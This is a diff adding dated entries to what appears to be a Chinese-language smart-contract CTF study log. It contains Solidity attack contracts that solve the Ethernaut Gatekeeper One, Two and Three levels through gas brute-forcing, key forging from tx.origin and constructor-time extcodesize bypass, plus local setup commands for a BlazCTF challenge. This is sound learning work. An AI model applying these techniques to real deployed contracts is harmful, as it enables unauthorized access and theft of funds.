@@ -313,4 +313,123 @@ contract AttackGoodSamaritan is INotifyable {
 }
 ```
 
+
+### 2024.09.14
+#### Ethernaut - Gatekeeper Three
+满足题目的三个 modifier，就可以成为参赛者。
+实例地址：0x784872141affcfD443a6f43093Ed81B0BB6d6D04
+```
+contract AttackGatekeeperThree {
+    address public gateAddr;
+
+    constructor(address addr) {
+        gateAddr = addr;
+    }
+
+    error Error1();
+
+    function setConstruct0r() public {
+        GatekeeperThree(payable (gateAddr)).construct0r();
+    }
+
+    function getAllowance() public {
+        uint256 t = block.timestamp;
+        GatekeeperThree(payable (gateAddr)).getAllowance(t);
+        GatekeeperThree(payable (gateAddr)).getAllowance(t);
+    }
+
+    function setEnter() public {
+        GatekeeperThree(payable (gateAddr)).enter();
+    }
+
+    receive() external payable {
+        revert Error1();
+    }
+}
+```
+
+### 2024.09.15
+#### Ethernaut - GateKeeper One
+要满足几个条件才能通过题目。
+分析条件一，对于uint64,需要高32位不为0，低16位和tx.origin的低16位相同，中间16位为0
+条件二，通过循环暴力做出来了。可以在调用 enter 时可以通过 gas 设置传递的 gas 费
+实例地址：0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93
+```
+contract AttackGatekeeperOne {
+    address public _gateAddr = 0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93;
+    event Log(uint256 i, uint256 gas);
+    bytes8 public gateKey2 = 0x000000010000a345;
+
+    constructor() {}
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function getGateThree() public view returns (bytes8) {
+        uint16 low16 = uint16(uint160(tx.origin));
+        uint32 low32 = uint32(low16);
+        uint64 _gateKey = (uint64(1) << 32) | uint64(low32);
+        return bytes8(_gateKey);
+    }
+
+    function checkGateKey(bytes8 _gateKey) public gateThree(_gateKey) view returns (bool) {
+        return true;
+    }
+
+    function getEnter(uint256 number) public  {
+        bool successed = false;
+        for (uint256 i = 500*number; i < 500*(number+1); i++) {
+            if (successed) break;
+            try GatekeeperOne(_gateAddr).enter{gas: 50000+i}(gateKey2) {
+                emit Log(i, gasleft());
+                successed = true;
+            } catch {
+            }
+        }
+        require(successed);
+    }
+}
+```
+
+### 2024.09.16
+#### Ethernaut - GateKeeper Two
+和 GateKeeper One 类似，需要过几个关卡
+关卡1: 要求使用合约来调用 enter 方法
+关卡2: 可以在合约的 constructor 方法中调用目标合约，这时候它还没有完成实例化，代码大小为 0
+关卡3: 学习如何进行异步运算
+实例地址：0x50d7242F965a27b97d15312b5370aF71079C1113
+```
+contract AttackGatekeeperTwo {
+    constructor() {
+        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));
+        address gateAddr = 0x50d7242F965a27b97d15312b5370aF71079C1113;
+        GatekeeperTwo(gateAddr).enter(_gateKey);
+    }
+}
+```
+### 2024.09.17
+#### blazctf2023 - rock scissor paper
+今天开始了解 blazctf 活动如何参加，尝试部署题目的环境
+1. 启动 基础服务器。需要注意网络问题
+```
+cd infrastucture/paradigmctf.py
+docker-compose up -d
+```
+2. 启动题目相关的容器
+```
+cd challenges/rock-paper-scissor/challenge
+docker-compose up -d
+nc localhost 1337 
+# 输入1创建题目实例
+# 提示找不到 ghcr.io/foundry-rs/foundry:latest
+docker pull --platform linux/amd64  ghcr.io/foundry-rs/foundry:latest
+docker tag ghcr.io/foundry-rs/foundry:latest foundry:latest
+nc localhost 1337 # 再次创建，成功。得到相关的 rpc 地址
+```
+3. 部署 blockscout。目前部署还有些问题，明天来解决
+
 <!-- Content_END -->
